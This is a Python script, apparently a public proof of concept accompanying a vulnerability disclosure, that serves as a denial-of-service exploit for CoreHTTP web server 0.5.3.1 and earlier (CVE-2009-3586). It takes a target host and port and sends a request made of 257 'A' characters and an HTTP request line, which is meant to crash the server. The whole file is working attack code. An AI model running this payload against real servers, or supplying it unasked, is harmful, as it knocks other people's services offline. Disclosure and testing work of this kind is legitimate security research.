#!/usr/bin/env python
# corex.py -- Patroklos Argyroudis, argp at domain census-labs.com
#
# Denial of service exploit for CoreHTTP web server version <= 0.5.3.1:
#
# http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3586
#
# For a detailed analysis see:
#
# http://census-labs.com/news/2009/12/02/corehttp-web-server/

import os
import sys
import socket

def main(argv):
    argc = len(argv)

    if argc != 3:
        print "usage: %s <host> <port>" % (argv[0])
        sys.exit(0)

    host = argv[1]
    port = int(argv[2])

    print "[*] target: %s:%d" % (host, port)

    payload = "A" * 257 + "/index.html HTTP/1.1\r\n\r\n"

    print "[*] payload: %s" % (payload)

    sd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sd.connect((host, port))
    sd.send(payload)
    sd.close()

if __name__ == "__main__":
    main(sys.argv)
    sys.exit(0)

# EOF
